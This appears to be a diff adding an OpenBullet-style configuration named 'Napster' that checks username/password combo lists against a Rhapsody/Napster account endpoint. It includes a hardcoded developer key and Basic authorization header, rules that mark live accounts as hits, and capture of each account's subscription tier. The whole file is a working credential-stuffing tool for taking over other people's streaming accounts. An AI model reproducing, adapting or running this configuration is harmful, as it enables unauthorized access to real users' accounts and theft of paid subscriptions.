@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Napster",
+  "SuggestedBots": 20,
+  "LastModified": "2018-05-18T20:41:51.3629912+00:00",
+  "AdditionalInfo": "",
+  "Author": "Chaos",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Subscription_Capture REQUEST GET "https://direct.rhapsody.com/authserver/v3/useraccounts?userName=<USER>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-rds-authentication: <PASS>" 
+  HEADER "x-rds-devkey: 4B8C5B7B5B7B5I4H" 
+  HEADER "Authorization: Basic cmhhcGNvbToyWTZIWTJxYlRURnltb1llcmZ1Wg==" 
+#Keywords KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success AND 
+    KEY "parentalControlEnabled=\"false\"" 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "<SOURCE>" DoesNotContain "trialTerminationDate\":null" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "204" 
+    KEY "tierCode=\"R25\"" 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "<RESPONSECODE>" Contains "403" 
+#Product_Code_Capture PARSE "<SOURCE>" LR "marketName=\"" "\"" Recursive=FALSE -> CAP "Subscription" "" "" 
